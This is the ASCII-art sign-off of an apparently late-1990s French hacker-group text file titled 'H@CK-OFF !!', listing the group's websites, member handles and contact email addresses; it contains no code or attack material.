~~    ~~    ~~    ~~    ~-{/¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯\}-~    ~~    ~~    ~~    ~~
   ~~    ~~    ~~    ~~    ~ http://come.to/legang  ~~   ~~    ~~    ~~    ~~    
~~    ~~    ~~    ~~    ~~    ~                  ~    ~~    ~~   ~~    ~~    ~~ 
   ~~    ~~    ~~    ~~    ~ http://come.to/yopyop  ~~   ~~    ~~    ~~    ~~    
~~    ~~    ~~    ~~    ~                              ~    ~~    ~~    ~~    ~~
   ~~    ~~    ~~    ~ http://members.tripod.com/hackoolic ~    ~~    ~~    ~~   
~~    ~~    ~~    ~~    ~                              ~    ~~    ~~    ~~    ~~
...Des commentaires, des questions, des insultes, ecrivez aux membres du gang...
_________________________________________________________________________________
¬­®¯°±²³´µ·¸¹º»¿øØÞþæ¡¢£¤¥ ¦§¨©ª«¬­®¯°±²³´µ·¸¹º»¿øØÞþæ¡¢£¤¥ ¦§¨©ª«¬¡¢£¤¥ ¦§¨©ª«¬­
¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯
        		    ,ø¤º°`°º¤ø,¸¸,ø¤º°`°º¤ø,¸¸,ø¤º°`°º¤ø,
			    _____________________________________
			    (((((((      H@CK-OFF !!     ))))))))
			     ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
			    ~  ~   ¤º°`°º   ¤º°`°º   ¤º°`°º  ~  ~ 
			     ~  ~  | SE | - | RI | - | AL | ~  ~ 
			    ~  ~   | SA | - | VA | - | TE |  ~  ~ 
			     ~  ~  | SY | - | ST | - | EM | ~  ~ 
			    ~  ~   ø,¸¸,ø   ø,¸¸,ø   ø,¸¸,ø  ~  ~ 
			     Cakeii - Tobozo - Yopyop - Silk - Nk
			     Sniffdoz - Aolshame - Misto - Blured
			     ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
			                             {    \|/    
			     >http://come.to/legang  8  -- * --
			     >silk@silk.cut          {    /|\  
			     cakeii@usa.net 
			     nk01@n0past.com 
			     tobozo@biosys.net 
			     misto@bigfoot.com
			     sniffdoz@yahoo.com
			     yopyop@webmails.com
			     blured75@hotmail.com
			     aolshame@softhome.net
			     emminence@earthling.net
		        ø¤º°`°º¤ø,¸¸,ø¤º°`°º¤ø,¸¸,ø¤º°`°º¤ø,    
		       /   O o          O o          O o    \   
		       \    O            O            O     /   
		        º¤ø,¸¸,ø¤º°`°º¤ø,¸¸,ø¤º°`°º¤ø,¸¸,ø¤º     
		    ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
[EOF]
</pre>